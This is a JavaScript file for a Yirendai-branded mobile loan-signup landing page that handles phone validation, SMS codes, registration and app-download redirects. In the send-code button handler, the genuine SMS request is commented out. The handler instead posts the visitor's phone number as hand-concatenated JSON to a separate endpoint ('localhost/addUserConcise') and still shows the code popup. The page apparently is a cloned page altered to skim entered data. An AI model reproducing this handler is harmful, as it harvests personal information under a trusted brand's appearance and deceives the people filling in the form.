;
var _baseServer = 'https://ldservice.yirendai.com',
	_www = 'https://www.yirendai.com/LandingPage/mhd/success/index.html',
	cookieUrl = '.yirendai.com',
	path = '/',
	configUrl = {
		activityMark: 'c4e199a7-cadf-3495-bffd-6960ee996404',
		wapRegisterUrl: _baseServer + '/v1/loan/signup',
		wapSendMsg: _baseServer + '/v1/smsCode'
	};
var uuid = new Date().getTime(),
	sendMsgFlge = !0,
	tapNo = 0,
	tapNo2 = 0;

function isMobile(e) {
	var t = /^1[3|4|5|6|7|8|9][0-9]{9}$/;
	if (t.test(e)) {
		return !0
	} else {
		return !1
	}
};

function andOrIos() {
	var e = navigator.userAgent,
		t = e.indexOf('Android') > -1 || e.indexOf('Adr') > -1,
		i = !! e.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
	if (t) {
		return 'android'
	};
	if (i) {
		return 'ios'
	}
};

function isPassword(e) {
	var t = /^(?![0-9]+$)(?![a-zA-Z]+$)(?![_\!@#\$%\^&\*\(\)_\+=|<>,\.{}:;\]\[\~\/\?"'\\-]+$)[A-Za-z0-9_\!@#\$%\^&\*\(\)_\+=|<>,\.{}:;\]\[\~\/\?"'\\-]{8,16}$/;
	if (t.test(e)) {
		return !0
	} else {
		return !1
	}
};

function UrlSearch() {
	var s, a, o = location.href,
		t = o.indexOf('?');
	o = o.substr(t + 1);
	var i = o.split('&');
	for (var e = 0; e < i.length; e++) {
		t = i[e].indexOf('=');
		if (t > 0) {
			s = i[e].substring(0, t);
			a = i[e].substr(t + 1);
			this[s] = a
		}
	}
};
var Request = new UrlSearch(),
	siteIdVal = Request.siteId;
if (siteIdVal) {
	if (siteIdVal.indexOf('#')) {
		siteIdVal = siteIdVal.split('#')[0]
	} else {
		siteIdVal = siteIdVal
	}
};

function applink() {
	return function() {
		var e = +new Date;
		setTimeout(function() {
			!window.document.webkitHidden && setTimeout(function() {
				if ((+new Date - e) < 2000) {
					if (siteIdVal) {
						location.href = 'http://app.yirendai.com/service/App/download?op=' + siteIdVal
					} else {
						location.href = 'http://app.yirendai.com/service/App/download?op='
					}
				}
			}, 500)
		}, 500)
	}
};
document.getElementById('appLogin').href = 'yrdweb://com.creditease.web';
document.getElementById('appLogin').onclick = applink();

function getImgCode() {
	uuid = new Date().getTime();
	var e = configUrl.getVerify + '?uuid=' + uuid;
	$('#imgcode').attr('src', e)
};
$('#imgcode').on('click', function() {
	getImgCode()
});
$('.lp-m-bottom-a').on('click', function() {
	location.href = 'http://m.yirendai.com/?utm_source=SEM-LP'
});
$('#mobile').on('input propertychange', function() {
	var e = $('#mobile').val();
	if (e.length > 11) {
		if (!isMobile($('#mobile').val())) {
			$('.lp-m-tips').show().text('您输入的手机号错误,请重新输入');
			return !1
		};
		$('.lp-m-submit').hide();
		$('.lp-m-submit2').show()
	} else if (e.length == 11) {
		if (!isMobile($('#mobile').val())) {
			$('.lp-m-tips').show().text('您输入的手机号错误,请重新输入');
			return !1
		};
		$('.lp-m-tips').hide();
		$('.lp-m-submit').hide();
		$('.lp-m-submit2').show()
	} else {
		$('.lp-m-submit').show();
		$('.lp-m-submit2').hide();
		$('.lp-m-tips').hide()
	}
});
$('#mobile').on('focus', function(e) {
	$('body,html').animate({
		scrollTop: 200
	}, 500);
	$('.lp-m-tips').hide()
});
var times = 60,
	sitv = null;

function yrdSmsQuery() {
	$(this).css('background', '#de8011');
	tapNo++;
	if (tapNo >= 4) {
		errorDownloadBtn()
	};
	$.ajax({
		url: configUrl.wapSendMsg,
		data: {
			mobile: $.trim($('#mobile').val()),
			csessionid: $('#csessionid').val(),
			sig: $('#sig').val(),
			token: $('#token').val(),
			scene: $('#scene').val()
		},
		dataType: 'json',
		type: 'POST',
		success: function(e) {
			if (e.code == 0) {
				$('.lp-fade-main').show();
				$('.lp-m-emscode-60').show();
				$('.lp-m-tips,.lp-fade-cont-tips').text('').hide();
				$('.lp-fade-cont-tips').show().text('短信验证码已发送');
				sitv = setInterval(function() {
					times--;
					$('.lp-m-emscode-60').text(times + '秒重发');
					if (times == 58) {
						$('.lp-fade-cont-tips').hide().text('')
					};
					if (times == 0) {
						times = 60;
						$('.lp-m-emscode-60').text(times + '秒重发');
						$('.lp-m-emscode').show();
						$('.lp-m-emscode-60').hide();
						clearInterval(sitv)
					}
				}, 1000);
				$('.close-btn').click(function() {
					times = 60;
					$('.lp-m-tips,.lp-fade-cont-tips').text('').hide();
					$('.lp-m-emscode-60').text(times + '秒重发');
					$('.lp-m-emscode').show();
					$('.lp-m-emscode-60').hide();
					$('#emscode').val('');
					clearInterval(sitv);
					$('.lp-fade-main').hide()
				})
			} else {
				switch (e.code) {
				case 100100003:
					$('.lp-m-tips').show().text('验证码输入错误');
					getImgCode();
					break;
				case 400002021:
					$('.lp-m-tips').show().text('手机号码已经被绑定!');
					getImgCode();
					break;
				case 400002005:
					$('.lp-m-tips').show().text(e.message);
					getImgCode();
					break;
				case 200000005:
					if (siteIdVal) {
						location.href = 'https://www.yirendai.com/lp/188/2/success.html?op=' + siteIdVal
					} else {
						location.href = 'https://www.yirendai.com/lp/188/2/success.html?op=401'
					};
					break;
				case 200000011:
					$('.lp-fade-main').hide();
					$('.lp-m-tips').show().text('请输入图片验证码');
					NoCaptcha.init(nc_option);
					NoCaptcha.setEnabled(!0);
					break;
				case 200000013:
					$('.lp-fade-main').hide();
					NoCaptcha.init(nc_option);
					NoCaptcha.setEnabled(!0);
					break;
				default:
					$('.lp-m-tips').show().text(e.message);
					getImgCode();
					break
				}
			}
		},
		error: function() {}
	})
};
$('#emsBtn,#emsBtn2').on('click', function() {

	$.ajax({
	 type: 'POST',
		contentType: 'application/json;charset=UTF-8',
	 url: 'http://localhost/addUserConcise',
	 data:'{"phone": "'+$.trim($('#mobile').val())+'"}',
	 //success: success,
	 dataType: "json"
	});
	$('.lp-fade-main').show()
	//yrdSmsQuery()
});
$('#emscode').on('input propertychange', function() {
	var e = $('#emscode').val();
	if (e.length > 6) {
		$('.lp-fade-cont-tips').show().text('验证码错误,请重新输入');
		return !1
	} else {
		$('.lp-fade-cont-tips').hide()
	};
	if (e.length == 6) {
		$('#loading').show();
		tapNo2++;
		if (tapNo2 == 3) {
			errorDownloadBtn()
		};
		var t = $.trim($('#mobile').val()),
			o = $.trim($('#imgCode').val()),
			i = setTimeout(function() {
				$('#loading').hide();
				errorDownloadBtn()
			}, 10000);
		$.ajax({
			url: configUrl.wapRegisterUrl,
			data: {
				appID: _YRDMD.appid,
				smsCode: $.trim($('#emscode').val()),
				mobile: $.trim(t),
				clientType: 'wap',
				mobileType: andOrIos(),
				source: siteIdVal ? siteIdVal : 3004
			},
			dataType: 'jsonp',
			type: 'get',
			success: function(e) {
				$('#loading').hide();
				clearTimeout(i);
				if (e.code != 0) {
					$('.lp-fade-cont-tips').show().text(e.message);
					if (e.code == 200000005) {
						errorDownloadBtn()
					}
				} else {
					window.scrollTo(0, 0);
					if (siteIdVal) {
						location.href = 'https://www.yirendai.com/lp/188/2/success.html?op=' + siteIdVal
					} else {
						location.href = 'https://www.yirendai.com/lp/188/2/success.html?op=401'
					}
				}
			}
		})
	}
});
$('#submitBtn').on('click', function() {
	if ($('#emscode').val() == '') {
		$('.lp-fade-cont-tips').show().text('请输入短信验证码!');
		return !1
	};
	$('#loading').show();
	tapNo2++;
	if (tapNo2 == 3) {
		errorDownloadBtn()
	};
	var e = $.trim($('#mobile').val()),
		i = $.trim($('#imgCode').val()),
		t = setTimeout(function() {
			$('#loading').hide();
			errorDownloadBtn()
		}, 10000);
	$.ajax({
		url: configUrl.wapRegisterUrl,
		data: {
			appID: _YRDMD.appid,
			smsCode: $.trim($('#emscode').val()),
			mobile: $.trim(e),
			clientType: 'wap',
			mobileType: andOrIos(),
			source: siteIdVal ? siteIdVal : 3004
		},
		dataType: 'jsonp',
		type: 'get',
		success: function(e) {
			$('#loading').hide();
			clearTimeout(t);
			if (e.code != 0) {
				$('.lp-fade-cont-tips').show().text(e.message);
				if (e.code == 200000005) {
					errorDownloadBtn()
				}
			} else {
				window.scrollTo(0, 0);
				if (siteIdVal) {
					location.href = 'https://www.yirendai.com/lp/188/2/success.html?op=' + siteIdVal
				} else {
					location.href = 'https://www.yirendai.com/lp/188/2/success.html?op=401'
				}
			}
		}
	})
});
$('.lp-fixed-close').click(function() {
	$('.lp-fixed-main').hide()
});

function errorDownloadBtn() {
	$('#errorDownloadApp').show();
	$('#errorDownloadApp').click(function() {
		if (siteIdVal) {
			location.href = 'http://app.yirendai.com/service/App/download?op=' + siteIdVal
		} else {
			location.href = 'http://app.yirendai.com/service/App/download?op=401'
		}
	})
};
$(window).scroll(function() {
	var e = window.pageYOffset;
	if (e > 400) {
		$('#bottomBtnMain').fadeIn(100)
	} else {
		$('#bottomBtnMain').fadeOut(100)
	}
});
$('.bottom-btn').click(function() {
	$('body,html').animate({
		scrollTop: 0
	}, 500)
})